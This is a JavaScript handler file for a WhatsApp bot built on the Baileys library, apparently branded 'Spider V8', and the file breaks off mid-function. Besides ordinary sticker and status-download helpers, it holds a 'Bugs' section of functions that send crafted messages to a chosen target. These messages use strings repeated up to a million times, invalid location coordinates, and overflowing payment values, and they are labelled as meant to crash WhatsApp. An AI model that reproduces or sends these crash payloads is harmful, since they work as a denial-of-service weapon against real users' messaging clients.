const {
samConnect,
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
makeInMemoryStore,
prepareWAMessageMedia,
generateWAMessageFromContent,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
getContentType,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
proto,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")
const { SpdrUser } = require("./lib/lowdb/adapters/TextSync")
//=================================================//
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const jimp = require("jimp")
const fetch = require("node-fetch")
const speed = require("performance-now")
const moment = require("moment-timezone")
const pino = require("pino")
const { spawn: spawn, exec } = require("child_process")
const { Primbon } = require("scrape-primbon")
const primbon = new Primbon()
const fg = require("api-dylux")
const path = require("path")
const cheerio = require("cheerio")
const ytdl = require("ytdl-core")
const chalk = require("chalk")
const { color } = require("./lib/color")
const FormData = require("form-data")
const crypto = require("crypto")
const yts = require("yt-search")
const bochil = require("@bochilteam/scraper")
const fakeUA = require("fake-useragent")
const randomUA = fakeUA().toString()
const fs = require("fs")
const fonts = require('./lib/fonts.js');
const menufont = require('./lib/menufonts.js');
const availableStyles = Object.keys(fonts);
const availableFontStyles = Object.keys(menufont);
module.exports = sam = handler = async (sam, m, chatUpdate, store) => {
try {
//=================================================//
var body = m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.interactiveResponseMessage?.nativeFlowResponseMessage || m.text : ""
//=================================================//
require("./media/config")
const {
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom
} = require("./lib/myfunction")
const { remini } = require("./lib/remini")
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime, TelegraPh } = require("./lib/uploader")
const { toTelegra } = require("./lib/upload")
//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == "string" ? m.text : "")
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ""
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await sam.decodeJid(sam.user.id)
const itsMe = m.sender == botNumber ? true : false
const itsOrkay = JSON.parse(fs.readFileSync(path.resolve(__dirname, './database/premium.json'), 'utf8'))
const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, './database/owner.json'), 'utf8'))
const isCreator = [ botNumber, ...kontributor, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isPremium = [ botNumber, ...kontributor, ...itsOrkay, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./database/premium')
const orgkaya = JSON.parse(fs.readFileSync('./database/premium.json'))
const zetsQuoted = fs.readFileSync(`./media/spider.jpg`)
const testi  = require('./test.js')
//=================================================//
//Group
const groupMetadata = m.isGroup ? await sam.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
//=================================================//
const samido = fs.readFileSync(path.resolve(__dirname, './media/menu.mp3'))
const spider = fs.readFileSync(path.resolve(__dirname, './media/spider.jpg'))
//=================================================//
const from = m.chat;
//
//=================================================//
try {
   const cleaned = botNumber.replace("@s.whatsapp.net", "") 
   SpdrUser(cleaned).catch((error) => {
    console.log("Encountered Error in SpdrUser: ", error);
  });
} catch (error) {
	console.log("Encountered Error: ", error)
}
	
if (!sam.public) {
    if (!isCreator) return
}
if (typeof global.ownMain === 'undefined' || global.ownMain === null || global.ownMain === '') {
  console.log('Owner Variable is empty,set in config.js');
  process.exit()
}

//sam.public = false
//=================================================//
async function exifAvatar(buffer, packname, author, categories = [''], extra = {}) {
    const {
        default: {
            Image
        }
    } = await import('node-webpmux')
    const img = new Image()
    const json = {
        'sticker-pack-id': 'parel-kntll',
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        'is-avatar-sticker': 1,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}
//=================================================//
async function addExif(webpSticker, packname, author, categories = [''], extra = {}) {
    const img = new webp.Image()
    const stickerPackId = Crypto.randomBytes(32).toString('hex')
    const json = {
        'sticker-pack-id': stickerPackId,
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(webpSticker)
    img.exif = exif
    return await img.save(null)

}

try {
  const textLower = m.text.toLowerCase();

  if (textLower === 'send' || textLower === 'statusdown' || textLower === 'take') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;

    if (quotedMessage) {
      // Check if it's an image
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await
client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        client.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        reply('*Status Download Successful: by spider V1*');
      }

      // Check if it's a video
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        client.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        reply('*Status Download Successful: by spider V8*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}

//=================================================//
async function addExifAvatar(buffer, packname, author, categories = ["🥀"], extra = {}, ) {
    const {
        default: {
            Image
        },
    } = await import("node-webpmux")
    const img = new Image()
    const json = {
        "sticker-pack-id": "com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2",
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
        emojis: categories,
        "is-ai-sticker": 1,
        "android-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        "ios-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        ...extra,
    }
    let exifAttr = Buffer.from([
        0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
        0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    ])
    let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8")
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}
//=================================================//
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//=================================================//
const reaction = async (jidss, emoji) => {
    sam.sendMessage(jidss, {
        react: {
            text: emoji,
            key: m.key
        }
    })
}
const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": `🌠 ${global.botname} Project`,
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝙎𝙥𝙞𝙙𝙚𝙧-𝙑8 `
}
}
}
//=============================={{===[===============//
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./media/spider.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐒𝐏𝐈𝐃𝐄𝐑╮⭑ ☠️⃰͜͡؜𝐕8⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
    
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./media/spider.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭𝐒𝐏𝐈𝐃𝐄𝐑╮⭑ ☠️⃰͜͡؜𝐕8⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
const zets = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2024",
      thumbnail: zetsQuoted,
      itemCount: `2024`,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `⟡ ${m.body}͢`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 99999,
    isForwarded: true
  }
}
//================✓=✓✓=======================✓✓✓=//
async function Decrypt(query) {
  const deobfuscatedCode = new Deobfuscator();
  return deobfuscatedCode.deobfuscateSource(query);
}
//=================================================//
async function crtImg(url) {
    const { imageMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: sam.waUploadToServer
        })
    return imageMessage
}
//=================================================//
async function loadings () {
var lod = [
"> 𝐇𝐞𝐥𝐥𝐨 𝐇𝐮𝐦𝐚𝐧 🇰🇪",
"> 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐦𝐲 𝐆𝐫𝐞𝐚𝐭𝐞𝐬𝐭 𝐌𝐚𝐬𝐭𝐞𝐫 🕊️",
"> 𝐇𝐚𝐩𝐩𝐲 𝐓𝐨 𝐒𝐞𝐫𝐯𝐞 𝐘𝐨𝐮 🦋",
"> 𝐂𝐚𝐥𝐥 𝐦𝐞 𝐒𝐩𝐢𝐝𝐞𝐫-𝐕8 🕸️",
]
let { key } = await sam.sendMessage(from, {text: ''})

for (let i = 0; i < lod.length; i++) {
await sam.sendMessage(from, {text: lod[i], edit: key });
}
	 }
//=======≠============Bugs========================//
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await sam.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function location(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!!`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await sam.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "K-Tech"+" ".repeat(920000),
        'footerText': `K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!!`,
        'description': `K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!! K-Bug Universe!!!`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await sam.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function killpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "Spider Bug🪲",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.imgur.com/4VDBAQo.jpeg" } }, { upload: sam.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #K-Bug Universe!!!"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await sam.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function bugPayment(chats) {
await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: chats} })
} 


async function bugProduk(target, kuwoted) {
      var msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        listMessage: {
          title: '𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌' + "\0".repeat(999999),
          footerText: '.',
          description: '.',
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "anjay",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: '0@s.whatsapp.net'
          }
        },
        footer: 'puki',
        contextInfo: {
          expiration: 604800,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: true
        }
      }), {userJid: target, quoted: kuwoted});
      await sam.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id});
}

    async function bugpayflow(userJidx) {
            for (let i = 0; i < 20; i++) {
              const qpaybutton = {
                name: "payment_info",
                buttonParamsJson: JSON.stringify({
                  currency: "MYR",
                  total_amount: {
                  value: 999999999999,
                  offset: 999999999999
                  },
                  reference_id: "X0D3SK9ZD3V",
                  type: "physical-goods",
                  order: {
                    status: 'pending',
                    subtotal: {
                    value: 999999999999,
                    offset: 999999999999
                    },
                    order_type: 'ORDER',
                    items: [{
                      name: "📄 SCRIPT BUG VIRDARK . X ONE MYR.𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦",
                      amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                      quantity: 999999999999,
                      sale_amount: {
                      value: 999999999999,
                      offset: 999999999999
                      },
                    }]
                  },
                  payment_settings: [{
                    type: "pix_static_code",
                    pix_static_code: {
                      merchant_name: "SamCreator",
                      key: "WDX",
                      key_type: 'Q'
                    }
                  }]
                })
              };
              const nativeFlowMessage = {
                buttons: [qpaybutton]
              };
              const interactiveMessage = {
                nativeFlowMessage: nativeFlowMessage
              };
              const message = {
                messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
                },
                interactiveMessage: interactiveMessage
              };
              const viewOnceMessage = {
                message: message
              };
              const vrdrk = {
                viewOnceMessage: viewOnceMessage
              };
              await sam.relayMessage(userJidx, vrdrk, {
                participant: {
                  jid: userJidx
                }
              });
            }
            for (let j = 0; j < 3; j++) {
              const header = {
                title: '',
                subtitle: " "
              };
              const body = {
                text: "📄 SCRIPT BUG VIRDARK . CRASH ‍📄.SPIDERCRASHED . ‍📄.SPIDERCRASHED . ‍📄.SPIDERCRASHED .𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦"
              };
              const footer = {
                'text': "📄 SCRIPT BUG VIRDARK . CRASH ؂؃؂؃.؂؃؂؃.؂؃؂؃"
              };
              const displaybuttons = {
                name: "cta_url",
                buttonParamsJson : JSON.stringify({
                  display_text: "C҉R҉A҉S҉H҉ W҉H҉A҉T҉S҉A҉P҉P҉꙰꙰",
                  url: '',
                  merchant_url: ''
                })
              };
              const vrdrknew = {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: header,
                      body: body,
                      footer: footer,
                      nativeFlowMessage: {
                        buttons: [displaybuttons],
                        messageParamsJson: ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(100000)
                      }}}}};
              await sam.relayMessage(userJidx, vrdrknew, { participant: { jid: userJidx
                }})}}

  async function sendLiveLocationMessage2(target, kuoted) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "p",
            degreesLongitude: "p",
            caption: "K-Tech" + ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(50000),
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
        }
      }
    }), {
      userJid: target,
      quoted: kuoted
    });
    await sam.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
  }
    
async function coresix(target, text, amount, ptcp = false) {
    await sam.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: target } } : {}
    );
};
    
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: sam.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #ryozingoddominate"
      },
      nativeFlowMessage: {
        messageParamsJson: "".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await sam.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
    
async function aipong(target) {
await sam.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
} 


async function caroLoc(target, kuoted) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "-999999999999999999999999999",
            degreesLongitude: "-999999999999999999999999999",
            caption: "‌SPIDERॎ𝐄𝐗‌𝐄𝐂‌‌𝐔𝐓‌𝐈𝐎𝐍‌" + ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(750000),
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
        },
         carouselMessage: "{}"
      }
    }), {
      userJid: target,
      quoted: kuoted
    });
    await sam.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}
    
async function BugPayment(jid){
await sam.relayMessage(jid, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {}}, interactiveMessage: {
nativeFlowMessage: {
buttons: [
{
name: 'payment_info',
buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
},
],
}}}}}, { participant: { jid: jid } }, { messageId: null })}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await sam.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//================================================//
async function crtVid(url) {
    const { videoMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: sam.waUploadToServer
        })
    return videoMessage
}
//=================================================//
async function prM(params) {
    return await prepareWAMessageMedia(params, { upload: sam.waUploadToServer })
}
//=================================================//
const reply = async (teks) => {
    await sleep(500)
    return sam.sendMessage(m.chat, {
